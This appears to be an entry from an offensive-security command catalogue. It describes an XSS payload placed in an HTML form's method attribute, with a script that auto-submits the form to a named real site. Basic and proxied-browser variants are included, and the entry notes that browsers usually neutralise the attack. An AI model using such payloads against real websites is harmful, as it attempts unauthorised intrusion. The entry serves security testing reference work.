---
data: >-
  <form id="form" method="<img src=\"3\" onerror=\"alert(3)\"/>"
  action="https://gratipay.com"></form><script>document.getElementById('form').submit();</script>
tags:
  - xss
  - injection
type: command
executor: html
platforms:
  - Web
id: a456a29c-2735-47bd-9cd7-01288809eec5
created_at: '2025-12-14T03:15:41.418Z'
updated_at: '2025-12-14T03:15:41.418Z'
verified: false
validated: true
submitted: true
---
# submit-form-with-xss-method

## Command

```html
<form id="form" method="<img src=\"3\" onerror=\"alert(3)\"/>" action="https://gratipay.com"></form><script>document.getElementById('form').submit();</script>
```

## Description

This HTML snippet creates a form with an injected XSS payload in the method attribute and auto-submits it via JavaScript, attempting to exploit HTTP method reflection. In modern browsers, the method is coerced to GET, preventing exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| method | Injected payload (e.g., <img src=\"3\" onerror=\"alert(3)\"/> ) | Yes |
| action | Target URL (https://gratipay.com) | Yes |
| id | Form identifier for script targeting | Yes |

## Examples

### Basic Usage

```html
<form id="form" method="<img src=\"3\" onerror=\"alert(3)\"/>" action="https://gratipay.com"></form><script>document.getElementById('form').submit();</script>
```

### Advanced Usage

Embed in a local HTML file and open in a proxied browser to force submission.

```html
<!DOCTYPE html><html><body><form id="form" method="<script>alert(document.domain)</script>" action="https://gratipay.com"></form><script>document.getElementById('form').submit();</script></body></html>
```

## Expected Output

Browser rewrites to GET request; no XSS triggers. In proxy: potential reflection if method preserved, but typically fails due to browser enforcement.

## Related

- [[Related Procedure: Inject-XSS-Payload-in-HTTP-Method]]
